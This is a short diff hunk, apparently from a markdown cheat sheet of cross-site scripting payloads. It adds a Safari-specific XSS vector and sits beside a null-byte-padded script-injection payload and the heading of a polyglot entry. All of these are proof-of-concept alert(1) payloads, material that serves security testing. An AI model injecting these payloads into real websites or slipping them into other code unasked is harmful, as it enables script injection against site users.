@@ -26,6 +26,12 @@
 <x>%00%00%00%00%00%00%00<script>alert(1)</script>
 ```
 
+**Safari XSS Vector** by [@mramydnei](https://twitter.com/mramydnei/status/902470271327551489)
+
+```html
+<script>location.href;'javascript:alert%281%29'</script>
+```
+
 **XSS Polyglot** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
 
 ```
